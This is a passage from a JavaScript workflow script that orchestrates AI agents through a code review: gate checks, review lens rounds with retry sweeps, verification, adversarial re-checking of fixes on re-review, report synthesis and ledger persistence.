  log(`[${profile.id}] Gate: ${gateStatus} — ${gateProvenance}${failedChecks.length ? ` · failed: ${failedChecks.join(', ')}` : ''}${carriedChecks.length ? ` · ${carriedChecks.length} pre-existing (carried, not blocking)` : ''}`)
  // What a VERIFIER needs to run a tool, as opposed to what the RECORD needs to explain the gate.
  // Kept separate so the preflight's runner prefix never leaks into the persisted provenance string.
  const toolProvenance = [
    gateProvenance,
    preflight?.runner ? `run every tool as \`${flattenField(preflight.runner).trim()} <cmd>\` — bare invocations die in missing system libraries` : '',
    preflight?.blockers?.length ? `CANNOT compile here: ${preflight.blockers.map(flattenField).join('; ')} — a tool needing a build is unrunnable, say so rather than reporting its error as evidence` : '',
  ].filter(Boolean).join(' · ')
  // First checkpoint: from here on, a run that dies still says what was planned and whether the tree
  // was green. Everything before this point is cheap to redo; everything after it is not.
  await checkpoint(`${profile.id}-plan`, {
    language: profile.id, branch, head: baseRef,
    scout: { size: plan.sizeBucket, lenses: plan.lenses, maxRounds: plan.maxRounds, verifyVotes: plan.verifyVotes, securitySensitive: plan.securitySensitive },
    gate: { status: gateStatus, provenance: gateProvenance, failedChecks, carriedChecks, seeds: seedFindings.length },
    preflight: preflight ? { runner: preflight.runner, blockers: preflight.blockers, missingTools: preflight.missingTools, ciCovers: preflight.ciCovers } : null,
  }, 'Gate')
  if (gateStatus === 'fail') {
    return { profile, plan, ranLenses: [], lensRounds: [], gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], dropped: 0, notRun: [], criticNotes: '' }
  }

  // ---- Probe reviewer-agent availability ONCE up front ----
  // The per-lens fallback (runLens) already recovers, but it learns the miss only after the FIRST
  // attempt — and the round-1 lenses fan out in parallel, so without this every lens in round 1
  // would fail with "agent type '<x>' not found" before the memo is set. One cheap probe collapses
  // that opening wave to a single attempt. Best-effort: only a thrown /not found/ marks it missing;
  // a result, a null, or an unrelated error leaves the per-lens fallback to decide.
  if (profile.reviewerAgent && !reviewerAgentMissing) {
    try {
      await agent('Reply with the single word: OK.', { label: `probe:${profile.id}`, phase: 'Gate', model: 'haiku', effort: 'low', agentType: profile.reviewerAgent })
    } catch (e) {
      if (/not found/i.test(String((e && e.message) || e))) {
        reviewerAgentMissing = true
        log(`[${profile.id}] reviewer agent '${profile.reviewerAgent}' not registered — all lenses will use the generic subagent`)
      }
    }
  }

  // ---- Lenses (loop-until-dry) ----
  phase('Lenses')
  const seen = new Set()
  const pool = []
  for (const f of seedFindings) { const k = key(f); if (!seen.has(k)) { seen.add(k); pool.push(f) } }
  const notRun = []
  const ranAtLeastOnce = new Set()
  const lensRounds = []
  let dry = false
  for (let round = 1; round <= plan.maxRounds && !dry; round++) {
    const priorSummary = pool.length ? pool.map(f => `${f.file || '?'}:${f.line || 0} ${f.title}`).join('\n') : 'none yet'
    const results = (await parallel(plan.lenses.map(lens => () =>
      runLens(lens, lensPrompt(lens, priorSummary, profile, plan), 'Lenses', ` r${round}`),
    ))).filter(Boolean)
    for (const r of results) ranAtLeastOnce.add(r.lens)
    const fresh = []
    for (const r of results) {
      for (const f0 of (r.findings || [])) {
        const f = { ...f0, source: r.lens }
        const k = key(f)
        if (!seen.has(k)) { seen.add(k); fresh.push(f) }
      }
    }
    pool.push(...fresh)
    // Per-round yield, persisted to the run record. Lenses are the other half of a review's cost
    // (182 min / 31 agents on a measured run) and every round re-runs EVERY lens over the whole
    // diff, but whether round 2 earns that is unknowable after the fact: the gate's seed findings
    // make the pool non-empty from round 1, so a transcript cannot be split by round. Record it
    // rather than guess — a later `maxRounds` cut should be argued from these numbers.
    lensRounds.push({ round, agents: plan.lenses.length, returned: results.length, newFindings: fresh.length })
    log(`[${profile.id}] Lenses round ${round}: +${fresh.length} new (pool ${pool.length})`)
    if (!fresh.length) dry = true
  }

  // ---- Resurrection sweep ----
  // A lens agent occasionally returns null on a transient API death / connection drop and never
  // enters `ranAtLeastOnce`, which alone marks the whole review INCOMPLETE — even when the surviving
  // lenses found plenty. Since the failure is transient, a targeted retry of ONLY the missing lenses
  // recovers most of them. Bounded to 2 extra attempts; re-uses the same runLens/lensPrompt path.
  let missing = plan.lenses.filter(l => !ranAtLeastOnce.has(l))
  for (let sweep = 1; sweep <= 2 && missing.length; sweep++) {
    log(`[${profile.id}] Resurrection sweep ${sweep}: retrying ${missing.length} lens(es) that never returned (${missing.join(', ')})`)
    const priorSummary = pool.length ? pool.map(f => `${f.file || '?'}:${f.line || 0} ${f.title}`).join('\n') : 'none yet'
    const results = (await parallel(missing.map(lens => () =>
      runLens(lens, lensPrompt(lens, priorSummary, profile, plan), 'Lenses', ` resurrect${sweep}`),
    ))).filter(Boolean)
    for (const r of results) {
      ranAtLeastOnce.add(r.lens)
      for (const f0 of (r.findings || [])) {
        const f = { ...f0, source: r.lens }
        const k = key(f)
        if (!seen.has(k)) { seen.add(k); pool.push(f) }
      }
    }
    missing = plan.lenses.filter(l => !ranAtLeastOnce.has(l))
  }

  const droppedLenses = plan.lenses.filter(l => !ranAtLeastOnce.has(l))
  if (droppedLenses.length) {
    const reasons = droppedLenses.map(l => `${l}: ${lensFailures.get(l) || 'returned no result (skipped or died without an error)'}`).join(' · ')
    notRun.push(`${profile.id} lenses that never returned — ${reasons}`)
    log(`⚠️ [${profile.id}] ${droppedLenses.length} lens(es) never returned (${reasons}). Review marked INCOMPLETE.`)
  }
  // `ranLenses` rides along to the record: the dimension rows are built from plan.lenses, so a lens
  // that never returned still gets a row reading 0 findings — indistinguishable from a lens that ran
  // and found nothing. That is the difference between "redundant, consider dropping it" and "broken,
  // fix it", and the yield analysis inverts on it.
  const ranLenses = plan.lenses.filter(l => ranAtLeastOnce.has(l))
  // The lens phase is the expensive half of a review and the half most often lost: on the run that
  // prompted this, verification died to a usage limit and took every lens's yield with it.
  await checkpoint(`${profile.id}-lenses`, {
    language: profile.id, ranLenses, droppedLenses, lensRounds,
    candidates: summarizeFindings(pool),
    candidatesBySource: pool.reduce((m, f) => ({ ...m, [f.source || 'unknown']: (m[f.source || 'unknown'] || 0) + 1 }), {}),
    notRun,
  }, 'Lenses')
  if (!pool.length) {
    return { profile, plan, ranLenses, lensRounds, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], dropped: 0, notRun, criticNotes: '' }
  }

  // ---- Verify ----
  phase('Verify')
  const deduped = await dedupPool(rollupPool(pool, profile), profile)
  let { confirmed, suspected, dropped, refuted } = await verifyPool(deduped, plan, profile, toolProvenance)
  log(`[${profile.id}] Verify: ${confirmed.length} confirmed · ${suspected.length} suspected · ${dropped} refuted`)
  await checkpoint(`${profile.id}-verify`, {
    language: profile.id,
    verdict: finalVerdict(confirmed),
    findings: summarizeFindings(confirmed),
    verification: { candidates: deduped.length, confirmed: confirmed.length, suspected: suspected.length, refuted: dropped },
  }, 'Verify')

  // ---- Completeness critic (large or security-sensitive; budget-gated) ----
  phase('Synthesize')
  let criticNotes = ''
  const criticInScope = plan.sizeBucket === 'large' || plan.securitySensitive
  if (criticInScope && (!budget.total || budget.remaining() > 90000)) {
    const candidates = profile.lenses.filter(l => !plan.lenses.includes(l))
    const critic = await ragent(
      `You are a completeness critic for a ${profile.lang} review of the diff (base ${flattenField(baseRef) || 'HEAD'}).
Lenses already run: ${plan.lenses.join(', ')}. Confirmed: ${confirmed.length}, Suspected: ${suspected.length}.
Name any review lens that was NOT run but SHOULD be, given what the diff touches — choose ONLY from: ${JSON.stringify(candidates)}.
Also note in one line anything else likely missed (a changed file no finding touched, a claim left unverified). If coverage is complete, return missingLenses: [] and notes: "coverage complete".`,
      { label: `critic:${profile.id}`, phase: 'Synthesize', schema: CRITIC_SCHEMA, effort: 'low' },
    )
    criticNotes = critic?.notes ?? ''
    const followups = (critic?.missingLenses ?? []).filter(l => candidates.includes(l))
    if (followups.length && (!budget.total || budget.remaining() > 60000)) {
      log(`[${profile.id}] Completeness critic → follow-up lenses: ${followups.join(', ')}`)
      const priorSummary = `Earlier lenses already produced ${pool.length} findings — do NOT repeat them; surface only what your lens would add.`
      const extra = (await parallel(followups.map(lens => () =>
        runLens(lens, lensPrompt(lens, priorSummary, profile, plan), 'Synthesize', ' (critic)'),
      ))).filter(Boolean).flatMap(r => r.findings || [])
      const fresh = extra.filter(f => { const k = key(f); if (seen.has(k)) return false; seen.add(k); return true })
      if (fresh.length) {
        const v = await verifyPool(await dedupPool(fresh, profile), plan, profile, toolProvenance)
        confirmed = confirmed.concat(v.confirmed)
        suspected = suspected.concat(v.suspected)
        dropped += v.dropped
        refuted = refuted.concat(v.refuted)
        log(`[${profile.id}] Critic follow-up: +${v.confirmed.length} confirmed · +${v.suspected.length} suspected · ${v.dropped} refuted`)
      }
    } else if (followups.length) {
      notRun.push(`${profile.id} critic follow-up lenses (${followups.join('/')})`)
      log(`Budget low (~${Math.round(budget.remaining() / 1000)}k left) — SKIPPED [${profile.id}] critic follow-up lenses. Review marked INCOMPLETE.`)
    }
  } else if (criticInScope) {
    notRun.push(`${profile.id} completeness-critic`)
    log(`Budget low (~${Math.round(budget.remaining() / 1000)}k left) — SKIPPED [${profile.id}] completeness critic. Review marked INCOMPLETE.`)
  }

  return { profile, plan, ranLenses, lensRounds, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed, suspected, dropped, refuted, notRun, criticNotes }
}

// ================= Run each active profile, then merge =================
const results = []
for (const p of active) results.push(await reviewProfile(p))

// A red gate on any active language blocks the whole review (findings can't be trusted on a broken tree).
const gateFailed = results.filter(r => r.gateStatus === 'fail')
const mergedProvenance = results.map(r => `[${r.profile.id}] ${r.gateProvenance}`).join(' · ')
const mergedGateStatus = gateFailed.length ? 'fail' : (results.every(r => r.gateStatus === 'pass') ? 'pass' : 'unknown')

// carriedChecks prints on EVERY verdict, red or green. A red-but-not-yours check that only appeared
// on failure would be invisible exactly when the review passes — which is most of the time, and is
// precisely when a dependency backlog quietly grows.
function carriedSection() {
  const all = results.flatMap(r => (r.carriedChecks || []).map(c => `- [${r.profile.id}] ${c}`))
  return all.length
    ? `\n## Pre-existing — reported, not blocking\nThese are real and RED, but this diff did not cause them and no edit to the changed files clears them:\n${all.join('\n')}\n`
    : ''
}

// The synthesis agent writes the main report; a section it is not told about simply does not exist.
const carriedLine = (() => {
  const all = results.flatMap(r => (r.carriedChecks || []).map(c => `[${r.profile.id}] ${c}`))
  return all.length
    ? ` Then a \`## Pre-existing — reported, not blocking\` section listing these VERBATIM, one per line — they are RED and real but this diff did not cause them, so they must appear in the report while changing NOTHING about the verdict: ${JSON.stringify(all)}.`
    : ''
})()

function reviewRecord(extra) {
  return {
    schemaVersion: 1,
    runtime: 'claude-code',
    craftVersion: CRAFT_VERSION,
    kind: 'workflow',
    name: 'review',
    nested: !!viaArg,
    via: viaArg || null,
    branch, head,
    languages: active.map(p => p.id),
    uncoveredFiles,
    lensRounds: results.flatMap(r => (r.lensRounds || []).map(x => ({ language: r.profile.id, ...x }))),
    scout: results.map(r => ({ language: r.profile.id, size: r.plan.sizeBucket, lenses: r.plan.lenses, model: r.plan.lensModel, maxRounds: r.plan.maxRounds, verifyVotes: r.plan.verifyVotes })),
    gate: { status: mergedGateStatus, provenance: mergedProvenance, carriedChecks: results.flatMap(r => (r.carriedChecks || []).map(c => `[${r.profile.id}] ${c}`)) },
    outputTokens: budget.spent(),
    ...extra,
  }
}

if (gateFailed.length) {
  await logRun(reviewRecord({ verdict: 'Block', round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: null, notRun: [], failedChecks: gateFailed.flatMap(r => (r.failedChecks || []).map(c => `[${r.profile.id}] ${c}`)) }))
  return [
    `## Verdict`,
    `⛔ Block — mechanical gate is red (${gateFailed.map(r => r.profile.id).join(', ')}).`,
    ``,
    `## Gate`,
    mergedProvenance,
    `\nFailed checks:\n${gateFailed.flatMap(r => (r.failedChecks || []).map(c => `- [${r.profile.id}] ${c}`)).join('\n')}`,
    carriedSection(),
    ``,
    `Fix the gate before a semantic review is worthwhile.`,
  ].join('\n')
}

let confirmed = results.flatMap(r => r.confirmed)
let suspected = results.flatMap(r => r.suspected)

// ---- Adjudicate track (re-review only) ----
// For each prior-round finding, decide its fate this round. rejected/justified are carried (not
// re-raised) unless the code around them changed; open/deferred/confirmed priors get a targeted
// "is it still here?" check against the current tree.
const adjudicated = { resolved: [], stillOpen: [], regressed: [], carried: [] }
if (priorRound?.ledger?.length) {
  phase('Adjudicate')
  // Canonicalize prior severity ONCE, at the load boundary, BEFORE splitting/adjudicating/carrying:
  // LEDGER_ITEM.severity has no enum, so a drifted `critical`/`CRITICAL` prior would trip the
  // case-insensitive gates (isHighSeverity in classifyRedTeam / the red-team gate) yet be bucketed as
  // 0 Critical/0 High by countBySeverity (exact-case) — a fail-open re-review Approve over a
  // still-broken Critical fix. Mapping through canonicalSeverity here means adjudicateOne's
  // `located = {...f}` and EVERY downstream verdict/count (countBySeverity, rereviewVerdict, the strict
  // escalation) and the re-persisted ledger all see canonical severity for priors.
  const priorLedger = priorRound.ledger.map(f => ({ ...f, severity: canonicalSeverity(f.severity) }))
  const settled = priorLedger.filter(f => f.disposition === 'rejected' || f.disposition === 'justified')
  const toCheck = priorLedger.filter(f => !(f.disposition === 'rejected' || f.disposition === 'justified'))

  // Settled priors: carried unless the code around them changed since the prior round.
  const carriedResults = (await parallel(settled.map(f => () => {
    const pf = promptFields(f)
    return ragent(
      `A prior review finding was dismissed by the author (disposition: ${f.disposition}). Decide only whether the CODE AROUND IT CHANGED since commit ${flattenField(priorRound.head)}. Shell + read only.
FINDING: [${pf.severity}] ${pf.title} — at ${pf.file}:${f.line} (symbol ${pf.symbol}), rule ${pf.ruleId}.
Run \`git diff ${priorRound.head ? `${shq(priorRound.head)}...HEAD` : 'HEAD'} -- ${shq(f.file)}\` and judge whether the enclosing symbol/region was touched. Return {changed: <bool>, reason}.`,
      { label: `carry:${f.file}:${f.line}`, phase: 'Adjudicate', schema: CHANGED_SCHEMA, model: CULL_MODEL },
    ).then(r => ({ f, changed: r == null ? null : !!r.changed }))
  }))).filter(Boolean)
  // A dead carry agent (changed == null) is indeterminate — keep the dismissed prior as carried (do
  // NOT reopen on an indeterminate carry), but count + ⚠️-log it like the other death paths so this
  // is no longer the one unaudited death path.
  let carryDied = 0
  for (const { f, changed } of carriedResults) {
    if (changed === null) { carryDied++; log(`⚠️ carry-check for ${f.file}:${f.line} died — kept as carried by default`); adjudicated.carried.push(f) }
    else if (changed) adjudicated.stillOpen.push({ ...f, why: `${baseWhy(f.why)} (reopened: dismissed as ${f.disposition}, but the code around it changed — re-verify the justification)` })
    else adjudicated.carried.push(f)
  }

  // Open/deferred/confirmed priors: is the defect CLASS still present at its (re-located) site?
  // The adjudicator must state the violated invariant and attack the fix — a fix that closes the
  // literal repro but not the class must not close. A "resolved" Critical/High is then re-attacked
  // by an independent red-team agent that never sees the adjudicator's verdict.
  const adjudModel = results[0]?.plan?.lensModel || 'opus'
  let overturned = 0
  let redTeamDied = 0
  let invalidRedTeam = 0
  let adjudicatorDied = 0
  const redTeam = async (f, adj) => {
    if (!isHighSeverity(f.severity)) return adj
    const pf = promptFields(f)
    const rt = await ragent(
      `A code-review finding was raised on an earlier revision of this repo and the author has since pushed fix commits. Attack the fix. Shell + read only; do NOT hunt for unrelated bugs.
FINDING: [${pf.severity}] ${pf.title}
  originally at ${pf.file}:${f.line} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
  why it mattered: ${sanitizeAttack(f.why)}
INVARIANT it violated: ${redTeamInvariant(adj, f)}
METHOD: re-locate the symbol (grep it — the line has likely moved), read the current code, and try to CONSTRUCT a concrete input/state that violates the invariant even with the current code in place (canonical: the fix compares for exact equality where the invariant is about overlap/containment/ordering). Check every candidate against the actual code paths before claiming it works.
Return {defeated, attack} — defeated=true ONLY with a concrete attack that survives your own check against the code.`,
      { label: `redteam:${f.file}:${f.line}`, phase: 'Adjudicate', schema: ATTACK_SCHEMA, model: adjudModel },
    )
    // A dead red-teamer keeps `resolved`: the adjudicator already ran its own attack pass, and a
    // transient agent death must not spuriously reopen findings. But the degradation must be
    // auditable — count it, log it, and annotate the note so "red-team passed" is distinguishable
    // from "red-team never ran" in the report and the run log.
    const { adj: out, died, overturned: ov, invalid } = classifyRedTeam(f, adj, rt)
    if (died) { redTeamDied++; log(`⚠️ red-team for ${f.file}:${f.line} died — "resolved" stands on the adjudicator's own attack pass only`) }
    if (invalid) { invalidRedTeam++; log(`⚠️ red-team for ${f.file}:${f.line} claimed defeat with NO attack — invalid verdict discarded, keeping resolved`) }
    if (ov) overturned++
    return out
  }
  const checkResults = (await parallel(toCheck.map(f => () => {
    const pf = promptFields(f)
    return ragent(
      `You are adjudicating whether a prior review finding is still present after a fix attempt. Load the ${active[0].rubricSkill} skill for the rubric. Shell + read only; do NOT hunt for new bugs.
FINDING: [${pf.severity}] ${pf.title}
  originally at ${pf.file}:${f.line} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
  why it mattered: ${sanitizeAttack(f.why)}
METHOD:
  1. State in ONE sentence the INVARIANT this finding violated — the property that must hold, not the literal repro (derive it from the why/title).
  2. Re-locate the symbol (grep it — the line has likely moved) and read the fix.
  3. Construct AT LEAST TWO concrete attacks: inputs/states that would violate the invariant while the current fix is in place (canonical: the fix compares for exact equality where the invariant is about overlap/containment/ordering). Check each against the actual code.
  4. Decide:
  - "resolved": every attack fails — the fix closes the CLASS, not just the described instance.
  - "still-open": the defect is still present OR one of your attacks succeeds (cite the current file:line; put the attack in \`attack\`).
  - "regressed": the site was changed but now has a DIFFERENT defect of the same kind (cite it).
Return {status, currentLine, note, invariant, attack}.`,
      { label: `adjudicate:${f.file}:${f.line}`, phase: 'Adjudicate', schema: ADJUDICATE_SCHEMA, model: adjudModel },
    ).then(async r => ({ f, r: shouldRedTeam(r) ? await redTeam(f, r) : r }))
  }))).filter(Boolean)
  for (const { f, r } of checkResults) {
    const { track, entry, demoted, adjudicatorDied: adjDied } = adjudicateOne(f, r)
    if (demoted) log(`⚠️ adjudicator for ${f.file}:${f.line} returned resolved WITH an attack — demoting to still-open`)
    if (adjDied) { adjudicatorDied++; log(`⚠️ adjudicator for ${f.file}:${f.line} died — no verdict returned; kept still-open by default`) }
    adjudicated[track].push(entry)
  }
  log(`Adjudicate: ${adjudicated.resolved.length} resolved · ${adjudicated.stillOpen.length} still-open · ${adjudicated.regressed.length} regressed · ${adjudicated.carried.length} carried · ${overturned} overturned by red-team · ${redTeamDied} red-team died · ${invalidRedTeam} invalid red-team · ${adjudicatorDied} adjudicator died · ${carryDied} carry died`)
}

// On a re-review, lenses can re-surface a finding that is already tracked on the adjudicate track —
// always on a full re-scan (the lenses saw the whole diff), and even on the delta path when a fix
// commit touches a still-open site. Drop new findings that match a still-LIVE prior
// (still-open/regressed/carried) so they are not double-counted in the report or the persisted ledger.
// Do NOT dedup against RESOLVED priors: a new finding matching a resolved one is a regression signal
// and must survive.
if (priorRound) {
  const livePriors = [...adjudicated.stillOpen, ...adjudicated.regressed, ...adjudicated.carried]
  if (livePriors.length) {
    const before = confirmed.length + suspected.length
    confirmed = confirmed.filter(f => !livePriors.some(p => matchesPrior(f, p)))
    suspected = suspected.filter(f => !livePriors.some(p => matchesPrior(f, p)))
    const removed = before - (confirmed.length + suspected.length)
    if (removed) log(`Re-review: dropped ${removed} new finding(s) already tracked as a still-live prior (kept on the adjudicate track, not double-counted)`)
  }
}

const dropped = results.reduce((n, r) => n + r.dropped, 0)
const notRun = results.flatMap(r => r.notRun)
// Files no profile covered are a coverage hole, not a footnote: fold them into `notRun` so every
// downstream verdict (report line and persisted record alike) carries the INCOMPLETE marker and
// cannot read as a bare Approve over a diff that was only partly looked at.
if (uncoveredMaterial.length) notRun.push(uncoveredNotRunNote(uncoveredMaterial))
const criticNotes = results.map(r => r.criticNotes).filter(n => n && n.trim() && n.trim() !== 'coverage complete').map(n => n.trim()).join(' · ')

// A re-review with adjudicated content (still-open/regressed/resolved/carried priors) must fall
// through to the full synthesis so the re-review report renders — a bare "Approve — no findings"
// here would wrongly erase still-open/regressed priors.
const hasAdjudicated = !!(adjudicated.stillOpen.length || adjudicated.regressed.length || adjudicated.resolved.length || adjudicated.carried.length)
if (!confirmed.length && !suspected.length && !hasAdjudicated) {
  await logRun(reviewRecord({ verdict: `Approve${notRun.length ? ' (INCOMPLETE)' : ''}`, round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: { candidates: dropped, confirmed: 0, refuteRate: dropped ? 1 : 0 }, notRun }))
  const verdictLine = notRun.length
    ? `⚠️ Approve (INCOMPLETE) — gate ${mergedGateStatus}; no findings survived, but ${notRun.join('; ')} — this verdict covers ONLY what ran. Files listed as matching no language profile are outside this engine (${supportedLangLabel()}) and re-running will not review them — review them by hand or with a tool that speaks their language; anything else in the list is a failure to fix and re-run.`
    : `✅ Approve — gate ${mergedGateStatus}; no findings across ${active.map(p => p.id).join('+')}.`
  return [`## Verdict`, verdictLine, ``, `## Gate`, mergedProvenance, carriedSection(),
    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map(f => `- ${f}`)] : []),
  ].join('\n')
}

// ================= Synthesize one merged report =================
phase('Synthesize')
const isRereview = !!priorRound
const rereviewData = isRereview ? {
  resolved: adjudicated.resolved, stillOpen: adjudicated.stillOpen,
  regressed: adjudicated.regressed, carried: adjudicated.carried, neu: confirmed,
} : null
const report = await ragent(
  `You are consolidating a code review (languages: ${active.map(p => p.id).join(', ')}) into ONE markdown report. Do NOT invent findings — only use what is given.

VERDICT RULE: the verdict is driven ONLY by Confirmed findings.
- ⛔ Block if any Confirmed Critical or High.
- ⚠️ Warning if Confirmed Medium only.
- ✅ Approve if no Confirmed Critical/High/Medium.
Suspected findings NEVER change the verdict — they are surfaced for the author.${strict ? '\nSTRICT MODE: the maintainability bar is a presumption of block — if ANY Confirmed finding has source "maintainability" (or lists "maintainability" among its merged `sources`) at Medium or above, the verdict is ⛔ Block (state in the verdict line that strict maintainability mode escalated it).' : ''}

CALIBRATE severities across the Confirmed set so the same kind of issue is not Critical in one place and Medium in another; adjust outliers and say so in one line if you do. For any resource-exhaustion / algorithmic-complexity finding (SAF-009), severity must be MEASURED, not inherited from "same class as X" — a shared mechanism implies nothing about shared magnitude. Demand attack cost against a REAL-DATA baseline (not just the PoC's own numbers) and attacker-bytes-per-victim-CPU-second; where the finding carries no such measurement, say so and rate it conservatively rather than borrowing a neighbour's label.

DEDUPLICATE across lenses: findings that describe the same underlying defect (same file, same/overlapping lines, fixes that collapse into one edit) MUST be merged into ONE entry — keep the highest severity and the clearest why, credit the other lens in one clause. Never list per-lens duplicates as separate findings.

${isRereview ? `This is a RE-REVIEW (round ${thisRound}). Produce, in order:
1. \`## Verdict\` — driven ONLY by Still-open + Regressed + New Confirmed findings (Block on any Critical/High; Warning on Medium; else Approve). Resolved and Carried NEVER change the verdict.${notRun.length ? ` Append " · ⚠️ INCOMPLETE — parts of the review did not run: ${notRun.join('; ')}; findings may be undercounted." to the verdict line.` : ''}
2. \`## Gate\` — ${JSON.stringify(mergedProvenance)}.${carriedLine}
3. \`## ✅ Resolved\` — prior findings the fixes closed (one line each); omit if empty.
4. \`## 🔴 Still open\` — prior findings still present; \`severity · file:line · [ruleId] · what · why\`; omit if empty.
5. \`## ⚠️ Regressed\` — new defects the fixes introduced at a prior site; omit if empty.
6. \`## 🆕 New\` — Confirmed findings from the delta lenses (same format); omit if empty.
7. \`## 🔽 Carried\` — dismissed priors (rejected/justified) carried forward unchanged, collapsed to a count + one-line list; omit if empty.${uncoveredFiles.length ? `\n8. \`## Not reviewed\` — these changed files match no active language profile and were NOT reviewed; list them verbatim: ${JSON.stringify(uncoveredFiles)}` : ''}${criticNotes ? `\n9. \`## Coverage gaps\` — surface verbatim: ${JSON.stringify(criticNotes)}` : ''}
RE-REVIEW DATA (JSON): ${JSON.stringify(rereviewData, null, 2)}` : `Produce, in order:
1. \`## Verdict\` — one line (emoji + reason).${notRun.length ? ` Append " · ⚠️ INCOMPLETE — parts of the review did not run: ${notRun.join('; ')}; findings may be undercounted." to the verdict line.` : ''}
2. \`## Gate\` — ${JSON.stringify(mergedProvenance)}.${carriedLine}
3. \`## Confirmed\` — findings by severity (Critical first), each as \`severity · file:line · [ruleId] · what · why · fix\` and a blast-radius note when present. Include the \`ruleId\` in brackets when the finding has a non-empty one; omit the brackets otherwise. When a finding carries a non-empty \`whereChecked\`, append \`· Premise checked at: <value>\` — that is the off-site evidence the author needs in order to re-check the claim, not decoration.
4. \`## Suspected (needs confirmation)\` — same format; omit the section if empty.
5. \`## Fix first\` — the few highest-leverage Confirmed items.
${uncoveredFiles.length ? `6. \`## Not reviewed\` — these changed files match no active language profile and were NOT reviewed; list them verbatim: ${JSON.stringify(uncoveredFiles)}` : ''}
${criticNotes ? `7. \`## Coverage gaps\` — surface verbatim: ${JSON.stringify(criticNotes)}` : ''}`}

CONFIRMED (JSON): ${JSON.stringify(confirmed, null, 2)}

SUSPECTED (JSON): ${JSON.stringify(suspected, null, 2)}`,
  { label: 'synthesis', phase: 'Synthesize', effort: 'medium' },
)

// Optional: post Confirmed findings as inline PR comments (best-effort).
if (postComments && confirmed.length) {
  await ragent(
    `Post these Confirmed code-review findings as inline comments on the current branch's PR using \`gh\`. If gh is missing/unauthenticated or there is no PR, do nothing and report that — never fail.
For each finding with a real file:line, add a review comment "[severity] why — fix" anchored to that file:line. Findings:
${JSON.stringify(confirmed.map(f => ({ file: f.file, line: f.line, severity: f.severity, why: f.why, fix: f.fix })), null, 2)}`,
    { label: 'pr-comments', phase: 'Synthesize', effort: 'low' },
  )
}

const allReviewFindings = confirmed.concat(suspected)
const totalVerified = confirmed.length + suspected.length + dropped
let recordVerdict = isRereview
  ? rereviewVerdict({ stillOpen: adjudicated.stillOpen, regressed: adjudicated.regressed, neu: confirmed })
  : finalVerdict(confirmed)
// Strict-mode maintainability escalation applies to a re-review too (finalVerdict already covers the
// first-pass path): a Confirmed Medium+ maintainability finding among the live re-review set blocks.
if (isRereview && strict && [...adjudicated.stillOpen, ...adjudicated.regressed, ...confirmed]
  .some(f => isMaintainability(f) && (f.severity === 'Critical' || f.severity === 'High' || f.severity === 'Medium'))) {
  recordVerdict = 'Block'
}
// Persist the ledger so round N+1 can find round N. On a re-review, carry the still-relevant priors
// forward (still-open/regressed as 'open', dismissed carried with their disposition) UNIONed with the
// new delta findings; resolved priors are intentionally dropped. Without this the ledger would hold
// only this round's delta, and a finding open across 3+ rounds — or a dismissed finding — would
// silently vanish after one hop.
const toLedgerEntry = (f, disposition, tier) => ({
  fp: f.fp || fingerprint(f), file: f.file || '', line: f.line || 0, symbol: f.symbol || '',
  severity: f.severity, tier: tier || f.tier || 'suspected', disposition: disposition || f.disposition || 'open',
  source: f.source || '', ruleId: f.ruleId || '', title: f.title || '', why: f.why || '',
  ...(Array.isArray(f.sources) ? { sources: f.sources } : {}),
})
const reviewLedger = isRereview
  ? [
    ...confirmed.map(f => toLedgerEntry(f, 'open', 'confirmed')),
    ...suspected.map(f => toLedgerEntry(f, 'open', 'suspected')),
    ...adjudicated.stillOpen.map(f => toLedgerEntry(f, 'open')),
    ...adjudicated.regressed.map(f => toLedgerEntry(f, 'open')),
    ...adjudicated.carried.map(f => toLedgerEntry(f, f.disposition)),
  ]
  : allReviewFindings.map(f => toLedgerEntry(f, 'open', confirmed.includes(f) ? 'confirmed' : 'suspected'))
await logRun(reviewRecord({
  verdict: recordVerdict + (notRun.length ? ' (INCOMPLETE)' : ''),
  round: thisRound,
  findings: summarizeFindings(allReviewFindings),
  ledger: reviewLedger,
  dimensions: results.flatMap(r => r.plan.lenses.map(l => {
    const s = summarizeFindings(r.confirmed.filter(f => (f.source || '') === l))
    const confirmedCount = r.confirmed.filter(f => (f.source || '') === l).length
    const suspectedCount = r.suspected.filter(f => (f.source || '') === l).length
    const refutedCount = (r.refuted || []).filter(f => (f.source || '') === l).length
    // `ran` distinguishes "executed and found nothing" from "never returned". Both otherwise render
    // as a 0-finding row, and the yield analysis would read a broken lens as a redundant one.
    // Absent `ranLenses` (a record written before this landed) → assume it ran, the old behaviour.
    const ran = r.ranLenses ? r.ranLenses.includes(l) : true
    return { dimension: `${r.profile.id}:${l}`, ran, verdict: '', findingCount: s.total, bySeverity: s.bySeverity, confirmedCount, suspectedCount, refutedCount }
  })),
  verification: { candidates: totalVerified, confirmed: confirmed.length, refuteRate: totalVerified ? Math.round((dropped / totalVerified) * 100) / 100 : 0 },
  notRun,
}))

// If the synthesis agent died even after the retry, don't lose the whole run — assemble a
// mechanical report from the verified findings (unmerged, but complete).
function fallbackReport() {
  // On a re-review the verdict must come from recordVerdict (still-open+regressed+new), NOT
  // finalVerdict(confirmed) — confirmed holds only the delta, so finalVerdict would print a false
  // Approve and hide live still-open/regressed priors. Render those tracks too.
  const emoji = { Block: '⛔ Block', Warning: '⚠️ Warning', Approve: '✅ Approve' }[isRereview ? recordVerdict : finalVerdict(confirmed)]
  const fmt = f => `- ${f.severity} · \`${f.file || '?'}:${f.line || 0}\`${f.ruleId ? ` · [${f.ruleId}]` : ''} · ${f.title} · ${f.why} · Fix: ${f.fix}${f.whereChecked ? ` · Premise checked at: ${f.whereChecked}` : ''}`
  const bySev = a => a.slice().sort((x, y) => (SEV_RANK[x.severity] ?? 9) - (SEV_RANK[y.severity] ?? 9))
  return [
    `## Verdict`,
    `${emoji} — synthesis agent died twice; mechanical fallback report (findings listed unmerged).${notRun.length ? ` · ⚠️ INCOMPLETE — parts of the review did not run: ${notRun.join('; ')}.` : ''}`,
    ``, `## Gate`, mergedProvenance, carriedSection(),
